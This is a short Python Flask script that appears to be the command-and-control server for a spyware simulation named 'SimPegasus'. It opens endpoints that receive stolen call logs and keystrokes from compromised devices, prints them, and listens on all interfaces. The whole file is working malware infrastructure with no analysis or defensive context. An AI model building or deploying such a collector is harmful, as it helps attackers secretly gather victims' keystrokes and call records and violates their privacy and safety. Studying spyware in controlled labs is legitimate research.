from flask import Flask, request
from datetime import datetime

app = Flask(__name__)


@app.route('/log', methods=['POST'])
def log():
    calls = request.form.get("calls", "NO CALL LOG RECEIVED")
    print(f"\n📞 Call Log @ {datetime.now()}:\n{calls}")
    return "Call logs received"

@app.route('/key', methods=['POST'])
def keylog():
    key = request.form.get("key", "NO KEYLOG RECEIVED")
    print(f"\n⌨ Keylog @ {datetime.now()}:\n{key}")
    return "Keylog received"

@app.route('/')
def index():
    return "SimPegasus C2 Server is running"

if __name__ == "__main__":
    print("🚀 SimPegasus Flask C2 Listening on http://0.0.0.0:8000 ...")
    app.run(host="0.0.0.0", port=8000)
